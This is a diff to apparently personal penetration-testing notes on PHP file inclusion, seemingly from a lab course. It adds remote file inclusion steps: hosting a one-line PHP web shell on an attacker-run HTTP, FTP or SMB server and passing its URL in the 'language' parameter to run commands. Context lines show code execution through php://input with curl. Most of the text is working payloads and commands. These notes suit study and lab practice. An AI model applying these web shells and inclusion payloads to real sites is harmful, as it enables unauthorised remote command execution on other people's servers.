@@ -51,6 +51,19 @@ Poison the Cookie
    * Execute code via curl, code goes where id is (3)
    > curl -s -X POST --data "<?php system('id'); ?>" "http://134.209.184.216:30084/index.php?language=php://input" | grep uid
 
+* Remote file Inclusion
+execute the below command while executing the broswer script http://website.com/index.php?language=http://yourserverip:8080/file
+> python3 -m http.server 8080
+create a file to call and put the following as contents <?php system($_GET['cmd']); ?>
+eg. shell.php 
+call the file with url http://website.com/index.php?language=http://yourserverip:8080/shell.php&cmd=id
+* FTP RFI can also be done via the below command while executing url http://blog.inlanefreight.com/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id
+> python -m pyftpdlib -p 21
+* Windos RFI 
+ can be called via the below command and url as follows http://blog.inlanefreight.com/index.php?language=\\serverIp\share\shell.php&cmd=whoami
+> smbserver.py -smb2support share $(pwd)
+
+*
 
 
 
